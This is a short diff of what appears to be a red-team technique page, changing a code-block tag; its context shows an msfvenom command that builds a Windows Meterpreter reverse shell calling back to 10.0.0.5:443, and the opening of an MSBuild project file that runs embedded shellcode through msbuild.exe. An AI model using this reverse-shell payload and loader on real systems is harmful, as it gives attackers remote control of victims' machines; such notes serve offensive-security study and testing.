@@ -17,7 +17,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
 Insert shellcode into the shellcode variable in linne 46:
 
 {% code title="bad.xml" %}
-```markup
+```xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
          <!-- This inline task executes shellcode. -->
          <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
